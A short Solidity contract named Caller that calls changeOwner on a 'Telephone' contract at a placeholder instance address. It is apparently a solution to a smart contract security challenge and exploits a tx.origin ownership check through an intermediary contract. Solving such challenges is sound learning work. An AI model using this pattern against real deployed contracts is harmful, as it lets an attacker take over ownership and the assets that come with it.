pragma solidity 0.6.0;

contract Caller {
    Telephone telephone = Telephone(YOUR_INSTANCE_ADD);

    function call() public {
        telephone.changeOwner(msg.sender);
    }
}